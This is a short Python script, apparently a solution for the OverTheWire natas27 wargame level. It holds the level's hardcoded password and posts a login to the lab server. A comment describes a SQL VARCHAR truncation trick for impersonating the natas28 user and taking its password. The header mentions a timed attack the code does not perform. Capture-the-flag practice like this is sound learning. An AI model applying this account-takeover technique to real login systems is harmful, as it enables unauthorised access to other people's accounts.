#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *
import base64


characters = lowercase + uppercase + digits	
	
username='natas27'
password='55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = "index-source.html"
session = requests.session()
response = session.post(url, auth=(username, password), data={'username':'natas28', 'password':'abcd'})

content = response.text
print content
print "="*80
# print session.cookies

# print  re.findall('Password: (.*)</pre>', content)[0]

# In SQL VARCHAR there is a vulnerability that if the length of the entered data is greated than the specified value it only takes the amount of specified varcahr value. Hence, we stored natas28 with a lot of garbage after that. Then when we login with that newly creted user, we get password natas28